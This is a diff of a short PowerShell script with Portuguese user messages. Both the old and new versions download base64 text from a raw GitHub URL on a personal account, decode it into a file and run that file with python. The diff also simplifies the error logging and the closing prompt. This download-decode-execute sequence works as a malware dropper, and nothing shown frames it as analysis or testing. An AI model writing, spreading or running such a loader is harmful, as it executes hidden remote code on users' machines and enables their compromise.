@@ -13,15 +13,15 @@ try {
         [Environment]::SetEnvironmentVariable('PATH', $env:PATH, 'Process')
     }
     
-    $raw = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/manotuslk2-web/profile/main/string.txt')
-    $clean = -join ($raw.ToCharArray() | Where-Object { $_ -match '[a-zA-Z0-9\+/=]' })
-    [IO.File]::WriteAllBytes($p, [Convert]::FromBase64String($clean))
+    $w = New-Object Net.WebClient
+    $raw = $w.DownloadString('https://raw.githubusercontent.com/manotuslk2-web/profile/main/string.txt')
+    $cleanBase64 = -join ($raw.ToCharArray() | Where-Object { $_ -match '[a-zA-Z0-9\+/=]' })
+    $bytes = [System.Convert]::FromBase64String($cleanBase64)
+    [System.IO.File]::WriteAllBytes($p, $bytes)
     
     python $p 2>&1 | Tee-Object -FilePath $l
 } catch {
-    "ERRO DETECTADO: $_" | Out-File $l -Append
-    $_.Exception.StackTrace | Out-File $l -Append
-    Write-Host "Erro gravado em $l" -ForegroundColor Red
+    $_.Exception.Message | Out-File $l
 }
 
-Read-Host "Pressione Enter para fechar"
+Read-Host "Execucao concluida. Pressione Enter para sair"
